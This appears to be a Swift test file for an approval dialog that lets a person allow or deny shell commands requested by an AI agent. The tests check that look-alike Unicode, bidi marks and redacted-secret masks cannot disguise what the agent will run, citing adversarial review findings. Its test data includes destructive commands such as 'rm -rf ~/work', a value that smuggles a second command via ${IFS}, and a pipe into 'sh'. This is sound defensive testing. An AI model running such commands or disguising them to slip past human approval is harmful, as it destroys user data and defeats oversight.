        check("blank_braille_is_escaped (U+2800)", escapes("a\u{2800}b"), ["⟨U+2800⟩"])
        check("literal_mark_characters_typed_by_the_agent_are_escaped", escapes("a\u{23CE}\u{21E5}\u{240D}\u{27E8}\u{27E9}b"),
              ["⟨U+23CE⟩", "⟨U+21E5⟩", "⟨U+240D⟩", "⟨U+27E8⟩", "⟨U+27E9⟩"])
        let typed = HA.display("rm x\u{23CE}\n")
        check("  and a typed mark is never a visible mark", typed.runs.filter { $0.kind == .visible }.map(\.text), ["⏎"])
        check("  only the real line break made one", typed.lineCount, 2)
        let fake = HA.display("a\u{27E8}U+202E\u{27E9}b")
        check("  a typed ⟨U+202E⟩ is escaped, not shown as a real mark", fake.plain, "a⟨U+27E8⟩U+202E⟨U+27E9⟩b")
    }

    /// Round 3 (Aegis N2, N3): every scalar outside printable ASCII is a mark, except the precomposed accented letters.
    static func escapeEverything() {
        print("every scalar outside printable ASCII is a mark")
        func marks(_ s: String) -> [String] { runs(HA.display(s), .escape) }
        // N2: unassigned scalars, default ignorable, drew nothing.
        check("unassigned U+2065 is marked", marks("~/wo\u{2065}r\u{FFF0}k"), ["⟨U+2065⟩", "⟨U+FFF0⟩"])
        check("  and the raw one is gone from the text", HA.display("~/wo\u{2065}rk").plain, "~/wo⟨U+2065⟩rk")
        check("U+FFF0 to U+FFF8 are marked", marks((0xFFF0...0xFFF8).map { String(UnicodeScalar($0)!) }.joined()).count, 9)
        check("a never assigned scalar of plane 3 is marked (U+30000 block end)", marks("a\u{3FFFD}b"), ["⟨U+3FFFD⟩"])
        // N3: look alikes of ASCII punctuation and digits.
        check("Greek question mark U+037E is marked", marks("echo a\u{037E} rm -rf ~"), ["⟨U+037E⟩"])
        check("curly quotes are marked", marks("echo \u{201C}done; rm -rf ~/work\u{201D}"), ["⟨U+201C⟩", "⟨U+201D⟩"])
        check("  and the shown text holds none of the quotes", HA.display("echo \u{201C}x\u{201D}").plain.contains("\u{201C}"), false)
        check("division slash U+2215 is marked", marks("rm -rf ~\u{2215}work"), ["⟨U+2215⟩"])
        check("hyphen U+2010 is marked", marks("rm \u{2010}rf x"), ["⟨U+2010⟩"])
        check("divides U+2223 and one dot leader U+2024 are marked", marks("a\u{2223}b\u{2024}c"), ["⟨U+2223⟩", "⟨U+2024⟩"])
        check("full width digits are marked", marks("kill -\u{FF19}"), ["⟨U+FF19⟩"])
        check("a Cyrillic only token is marked (ѕср)", marks("ѕср"), ["⟨U+0455⟩", "⟨U+0441⟩", "⟨U+0440⟩"])
        let ring = HA.display("r\u{20DD}m")
        check("an enclosing mark is marked, and the letters stay", ring.plain, "r⟨U+20DD⟩m")
        // What stays: ASCII, the three controls with their own marks, the precomposed accented letters.
        check("printable ASCII is never marked", marks(String((0x20...0x7E).map { Character(UnicodeScalar($0)!) })), [])
        check("line break, tab and carriage return keep their own marks, not an escape", marks("a\nb\tc\rd"), [])
        check("  they are the visible kind", runs(HA.display("a\nb\tc\rd"), .visible), ["⏎", "⇥", "␍"])
        check("precomposed accented letters stay unmarked", marks("caf\u{E9} \u{F1} \u{FC} \u{C5} \u{151}"), [])
        check("a decomposed accent is marked (not precomposed)", marks("e\u{301}"), ["⟨U+0301⟩"])
        // Every scalar of the BMP that is not allowed through is a mark in the shown text.
        var leaked = 0
        for v in 0x20..<0x3000 where !(0x20...0x7E).contains(v) && !(0xD800...0xDFFF).contains(v) {
            let u = UnicodeScalar(UInt32(v))!
            let d = HA.display("x" + String(u))
            if d.plain.unicodeScalars.contains(u) && HA.cells(u) == 8 && runs(d, .escape).isEmpty { leaked += 1 }
        }
        check("no scalar of U+0080 to U+2FFF other than the accented letters reaches the text unmarked", leaked > 0 ? leaked - accentedBelow3000() : 0, 0)
    }

    /// The precomposed accented letters exempt from the rule inside U+0080 to U+2FFF (they stay readable).
    static func accentedBelow3000() -> Int {
        var n = 0
        for v in 0xC0...0x17F {
            let u = UnicodeScalar(UInt32(v))!
            let d = HA.display("x" + String(u))
            if d.plain.unicodeScalars.contains(u) && runs(d, .escape).isEmpty { n += 1 }
        }
        return n
    }

    static func masks() {
        print("masked commands")
        for text in ["curl -H 'Authorization: Bearer ***' x", "API_KEY=***;rm -rf x", "echo ****", "a «redacted-secret» b",
                     "x «redacted:ghp_…» y", "[REDACTED PRIVATE KEY]", "Bearer [redacted]", "[redacted-jwt]", "echo «REDACTED»"] {
            check("hermes_mask_in_command_is_detected: \(text)", HA.hasMask(text), true)
        }
        for text in ["ls *", "echo **", "find . -name '*.c'", "grep -r 'a*b' .", "echo redacted", "rm -rf build/",
                     "cd ..", "ls ../x", "echo . .. . ..", "echo hello world", "git status"] {
            check("no mask: \(text)", HA.hasMask(text), false)
        }
        // Round 3 (Aegis N1): the shape Hermes writes for a value of 18 characters or more, first 6 ... last 4.
        // Rule: a run of 3 or more dots (… counts as 3) with a character other than white space on at least one side.
        // (The raw command of Aegis' input is `X_TOKEN=abcdef;rm${IFS}-rf${IFS}~/work;#wxyz rm -rf build/`; what Hermes sends is this.)
        for text in ["X_TOKEN=abcdef...wxyz rm -rf build/",
                     "curl -H 'Authorization: Bearer abcdef...wxyz' https://x",
                     "git clone ghp_ab...0123",
                     "curl https://abcdef...uvwx@host/x",
                     "mysql --password: hunter...ter2",
                     "echo eyJhbG...ijkl | sh",
                     "echo '{\"token\": \"abcdef...wxyz\"}'",
                     "echo abcdef\u{2026}wxyz",
                     "git diff a...b",
                     "echo ...x", "echo x...", "echo x....", "echo ....x", "echo ..\u{2026}x", "...x", "x..."] {
            check("hermes_head_and_tail_mask_is_detected: \(text)", HA.hasMask(text), true)
        }
        // White space around the dots does not clear them: the JSON field pass of the redactor keeps it inside the value
        // (the shapes below are what Hermes sends after its two passes for a command that hides shell code).
        for text in ["echo '{\"token\": \"abcde ... xyz\"}'; rm -rf build/",
                     "echo '{\"token\": \"      ...    \"}'; rm -rf build/",
                     "echo '\"token\": \"abcde ... xyz\"'; rm -rf build/",
                     "echo ... x", "echo x ...", "echo ....", "echo ..\u{2026}", "...", "echo \u{2026}", "echo \u{2026} \u{2026}"] {
            check("dots with white space on both sides are a mask too: \(text)", HA.hasMask(text), true)
        }
        for text in ["cd ..", "ls .", "ls ../x", "echo a.b.c", "echo . . .", "rm -rf build/"] {
            check("fewer than three dots in a row are not a mask: \(text)", HA.hasMask(text), false)
        }
        check("  the white space mask offers Once and Deny only",
              req("n1b", command: "echo '{\"token\": \"abcde ... xyz\"}'; rm -rf build/").offered, [.once, .deny])
        check("  the Aegis input is judged masked, so Once and Deny only",
              req("n1", command: "X_TOKEN=abcdef...wxyz rm -rf build/").offered, [.once, .deny])
        check("  and the wire carries no scope for it", HA.respondParams(req("n1", command: "t=abcdef...wxyz"), .always) == nil, true)
        let masked = req("m1", command: "API_KEY=***;rm -rf ~/work")
        check("a masked command is flagged", masked.masked, true)
        check("masked_request_offers_once_and_deny_only", masked.offered, [.once, .deny])
        check("  session is not a decision", HA.decision(for: "session", request: masked), nil)
        check("  always is not a decision", HA.decision(for: "always", request: masked), nil)
        check("  once stays", HA.decision(for: "once", request: masked), .once)
        check("  deny stays", HA.decision(for: "deny", request: masked), .deny)
        check("  the wire never carries a scope", HA.respondParams(masked, .always) == nil && HA.respondParams(masked, .session) == nil, true)
        check("  nor the api key request", HA.answerRequest(apiRoot: "https://h", key: "K", request: { var r = apiReq(); r.command = "t=***"; return r }(), choice: .always) == nil, true)
        var q = Queue()
        _ = q.add(masked, display: HA.display(masked.command), turn: 1); _ = q.promoteNext()
        q.select(.always)
        check("  the selector cannot move to it", q.scope, .once)
        check("  and a click for it is dropped", q.click(.always, id: "m1"), .dropped)
        let parsed = HA.parseSignIn(frame(params: params(["command": "echo ***"])), agent: "a")
        check("parsed from the wire: masked", [parsed?.masked == true, parsed?.offered == [.once, .deny]], [true, true])
    }

    static func grants() {
        print("what Session and Always grant")
        let rd = "recursive delete"
        check("grant_label_is_the_description", HA.grantLabel(description: rd, patternKeys: [rd]), rd)
        check("  a request that carries it offers all four", req("g").offered, [.once, .session, .always, .deny])
        check("grant_missing_description_offers_once_and_deny", HermesApprovalRequest(agentName: "a", origin: .signIn(frameID: "srq-x", runtimeSession: "s"),
              requestID: "g", command: "rm x", description: "", choices: [.once, .session, .always, .deny], patternKeys: [rd]).offered, [.once, .deny])
        check("grant_blank_description", HA.grantLabel(description: "  \n ", patternKeys: [rd]) == nil, true)
        check("grant_no_pattern_key_cannot_be_checked", HA.grantLabel(description: rd, patternKeys: []) == nil, true)
        check("grant_description_that_does_not_cover_the_key", HA.grantLabel(description: "delete", patternKeys: [rd]) == nil, true)
        check("grant_several_keys_all_covered", HA.grantLabel(description: "recursive delete; SQL DROP", patternKeys: ["recursive delete", "SQL DROP"]), "recursive delete; SQL DROP")
        check("grant_several_keys_not_all_covered_offers_once_and_deny", HA.grantLabel(description: "recursive delete", patternKeys: ["recursive delete", "SQL DROP"]) == nil, true)
        check("grant_non_ascii_description", HA.grantLabel(description: "recursive d\u{0435}lete", patternKeys: ["recursive d\u{0435}lete"]) == nil, true)
        check("grant_control_character", HA.grantLabel(description: "recursive\u{1B}[0m delete", patternKeys: ["recursive"]) == nil, true)
        check("grant_with_a_line_break", HA.grantLabel(description: "recursive\ndelete", patternKeys: ["recursive"]) == nil, true)
        check("grant_bidi_override", HA.grantLabel(description: "recursive \u{202E}delete", patternKeys: ["recursive"]) == nil, true)
        check("grant_fits: 18 of the widest letter", HA.grantLabel(description: String(repeating: "W", count: 18), patternKeys: ["W"]) != nil, true)
        check("grant_does_not_fit: 22 of the widest letter", HA.grantLabel(description: String(repeating: "W", count: 22), patternKeys: ["W"]) == nil, true)
        check("grant_does_not_fit: 80 ordinary characters", HA.grantLabel(description: String(repeating: "a", count: 80), patternKeys: ["a"]) == nil, true)
        check("grant_markdown_is_data: it is kept as text", HA.grantLabel(description: "[x](http://e) %@", patternKeys: ["[x]"]), "[x](http://e) %@")
        let noGrant = HermesApprovalRequest(agentName: "a", origin: .signIn(frameID: "srq-x", runtimeSession: "s"), requestID: "g", command: "rm x",
                                            description: "", choices: [.once, .session, .always, .deny])
        check("without a grant: session is not a decision", HA.decision(for: "session", request: noGrant), nil)
        check("  always is not a decision", HA.decision(for: "always", request: noGrant), nil)
        check("  the wire builders return nil", HA.respondParams(noGrant, .session) == nil && HA.respondParams(noGrant, .always) == nil, true)
        var q = Queue()
        _ = q.add(noGrant, display: HA.display("rm x"), turn: 1); _ = q.promoteNext()
        q.select(.session)
        check("  the selector stays on once", q.scope, .once)
        check("  a click for it is dropped", q.click(.session, id: "g"), .dropped)
        // From the wire
        let withKeys = HA.parseSignIn(frame(params: params(["description": "recursive delete", "pattern_key": "recursive delete", "pattern_keys": ["recursive delete"]])), agent: "a")
        check("parsed: the keys are read", withKeys?.patternKeys, ["recursive delete", "recursive delete"])
        check("  and offered", withKeys?.offered, [.once, .session, .always, .deny])
        let badKey = HA.parseSignIn(frame(params: params(["description": "recursive delete", "pattern_key": 5])), agent: "a")
        check("parsed: a key that is not text leaves nothing nameable", [badKey?.patternKeys.isEmpty, badKey?.offered == [.once, .deny]], [true, true])
        let plainOld = HA.parseSignIn(frame(params: params(["description": "recursive delete"])), agent: "a")
        check("parsed: a server that sends no key offers once and deny", plainOld?.offered, [.once, .deny])
        let manyKeys = HA.parseSignIn(frame(params: params(["description": "a; b", "pattern_keys": ["a", "b", "c"]])), agent: "a")
        check("parsed: several keys the description does not cover", manyKeys?.offered, [.once, .deny])
        let api = HA.parseAPIEvent(apiEvent(["description": "recursive delete", "pattern_key": "recursive delete"]), agent: "m")
        check("api event: the key is read too", api?.offered, [.once, .session, .always, .deny])
        let apiBare = HA.parseAPIEvent(apiEvent(["description": "d", "pattern_key": "k"]), agent: "m")
        check("api event: a description that does not say the key offers once and deny", apiBare?.offered, [.once, .deny])
        let aliased = HA.parseSignIn(frame(params: params(["description": "recursive delete", "pattern_key": "recursive delete", "pattern_keys": ["recursive delete", "legacy_regex_key"]])), agent: "a")
        check("a legacy key the description does not say leaves once and deny", aliased?.offered, [.once, .deny])
    }

    // MARK: Wire builders

    static func wire() {
        print("wire")
        let r = req("r1")
        check("respond params carry session, request id and choice only", HA.respondParams(r, .once).map { Set($0.keys) }, ["session_id", "request_id", "choice"])
        check("  values", HA.respondParams(r, .deny)?["choice"], "deny")
        check("  session id is the runtime one", HA.respondParams(r, .once)?["session_id"], "run-1")
        check("approval_respond_never_carries_all", HA.respondParams(r, .once)?["all"] == nil, true)
        check("respond refuses a choice the server did not offer", HA.respondParams(req("r1", choices: [.once, .deny]), .always) == nil, true)
        check("respond is not built for an api key request", HA.respondParams(apiReq(), .once) == nil, true)
        check("capabilities params", (HA.capabilitiesParams()["server_requests"] as? Bool), true)
        check("pending params", HA.pendingParams(session: "run-1")["session_id"] as? String, "run-1")
        check("received params", (HA.receivedParams(r)?["request_id"]), "r1")
        // API request
        let ar = HA.answerRequest(apiRoot: "https://h.example.com", key: "KEY123", request: apiReq(), choice: .once)
        check("answer posts to runs approval", ar?.url?.absoluteString, "https://h.example.com/v1/runs/chatcmpl-abc123/approval")
        check("  method", ar?.httpMethod, "POST")
        check("  bearer", ar?.value(forHTTPHeaderField: "Authorization"), "Bearer KEY123")
        check("  content type", ar?.value(forHTTPHeaderField: "Content-Type"), "application/json")
        check("  timeout 10", ar?.timeoutInterval, 10)
        let body = ar?.httpBody.flatMap { try? JSONSerialization.jsonObject(with: $0) as? [String: Any] }
        check("  body has choice and request id only", body.map { Set($0.keys) }, ["choice", "request_id"])
        check("  body values", [body?["choice"] as? String, body?["request_id"] as? String], ["once", "r9"])
        let prof = HA.answerRequest(apiRoot: "https://h.example.com/p/codex", key: "K", request: apiReq(), choice: .deny)
        check("answer_url_uses_profile_root", prof?.url?.absoluteString, "https://h.example.com/p/codex/v1/runs/chatcmpl-abc123/approval")
        check("answer refuses a run id with path characters", HA.answerRequest(apiRoot: "https://h", key: "K", request: apiReq(run: "chatcmpl-a/../b"), choice: .once) == nil, true)
        check("answer refuses a choice not offered", HA.answerRequest(apiRoot: "https://h", key: "K", request: apiReq(choices: [.once, .deny]), choice: .session) == nil, true)
        check("answer is not built for a sign in request", HA.answerRequest(apiRoot: "https://h", key: "K", request: req(), choice: .once) == nil, true)
        // frame parsers
        check("capabilities result with approval", HA.parseCapabilities(json(["jsonrpc": "2.0", "id": 3, "result": ["server_requests": ["approval", "clarify"], "declines_not_shown": true]]), id: 3), ["approval", "clarify"])
        check("capabilities result for another id", HA.parseCapabilities(json(["jsonrpc": "2.0", "id": 4, "result": ["server_requests": ["approval"]]]), id: 3) == nil, true)
        check("capabilities result without the list", HA.parseCapabilities(json(["jsonrpc": "2.0", "id": 3, "result": ["ok": true]]), id: 3) == nil, true)
        check("respond result", HA.parseResolved(json(["jsonrpc": "2.0", "id": 9, "result": ["resolved": 1]]), id: 9), 1)
        check("respond result zero", HA.parseResolved(json(["jsonrpc": "2.0", "id": 9, "result": ["resolved": 0]]), id: 9), 0)
        check("respond result not a number", HA.parseResolved(json(["jsonrpc": "2.0", "id": 9, "result": ["resolved": "yes"]]), id: 9) == nil, true)
        check("respond result true counts as applied (1)", HA.parseResolved(json(["jsonrpc": "2.0", "id": 9, "result": ["resolved": true]]), id: 9), 1)
        check("respond result false counts as zero", HA.parseResolved(json(["jsonrpc": "2.0", "id": 9, "result": ["resolved": false]]), id: 9), 0)
        check("pending result ids", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": [["request_id": "r1"], ["request_id": "r2", "command": "x"]]]]), id: 5), ["r1", "r2"])
        check("pending_result_with_an_entry_without_a_valid_id_is_nil (do nothing)", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": [["request_id": "r1"], ["nope": 1]]]]), id: 5) == nil, true)
        check("  an id with a slash", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": [["request_id": "a/b"]]]]), id: 5) == nil, true)
        check("  another key than request_id", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": [["id": "r1"]]]]), id: 5) == nil, true)
        check("  an empty list is a real answer: nothing pending", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": []]]), id: 5), [])
        check("http resolved true counts as applied", HA.parseHTTPResolved(Data(#"{"resolved": true}"#.utf8)), 1)
        check("http resolved false counts as zero", HA.parseHTTPResolved(Data(#"{"resolved": false}"#.utf8)), 0)
        check("http resolved 1", HA.parseHTTPResolved(Data(#"{"resolved": 1}"#.utf8)), 1)
        check("pending result malformed", HA.parsePendingIDs(json(["jsonrpc": "2.0", "id": 5, "result": ["approvals": "x"]]), id: 5) == nil, true)
        let cancel = json(["jsonrpc": "2.0", "method": "event", "params": ["type": "request.cancel", "session_id": "run-1", "payload": ["id": "srq-0123456789ab", "method": "approval", "reason": "timeout"]]])
        check("request.cancel parsed", HA.parseCancel(cancel)?.frameID, "srq-0123456789ab")
        check("  reason", HA.parseCancel(cancel)?.reason, .timeout)
        let cancelOther = json(["jsonrpc": "2.0", "method": "event", "params": ["type": "request.cancel", "payload": ["id": "srq-0123456789ab", "method": "clarify", "reason": "timeout"]]])
        check("request_cancel_for_another_method_is_ignored", HA.parseCancel(cancelOther) == nil, true)
        let broadcast = json(["jsonrpc": "2.0", "method": "event", "params": ["type": "approval.cancelled", "session_id": "run-1", "payload": ["session_id": "run-1", "reason": "interrupt", "cancelled_count": 2, "request_ids": ["r1", "r2", 7]]]])
        check("approval.cancelled ids", HA.parseCancelled(broadcast)?.ids, ["r1", "r2"])
        check("  reason maps to interrupted", HA.parseCancelled(broadcast)?.reason, .interrupted)
        check("reason words", [HA.reason(fromServer: "timeout"), HA.reason(fromServer: "resolved"), HA.reason(fromServer: "interrupted"), HA.reason(fromServer: "session_closed"), HA.reason(fromServer: "shutdown"), HA.reason(fromServer: "weird")],
              [.timeout, .resolved, .interrupted, .sessionClosed, .interrupted, .other])
        check("every withdrawal has its own sentence", Set([HermesApproval.WithdrawReason.timeout, .resolved, .interrupted, .socketLost, .agentRemoved, .stale].map { HA.note(for: $0) }).count, 6)
    }

    static func apiReq(run: String = "chatcmpl-abc123", choices: Set<Choice> = [.once, .session, .always, .deny]) -> HermesApprovalRequest {
        HermesApprovalRequest(agentName: "mark", origin: .apiKey(runID: run), requestID: "r9", command: "ls", description: "recursive delete", choices: choices, patternKeys: ["recursive delete"])
    }
}
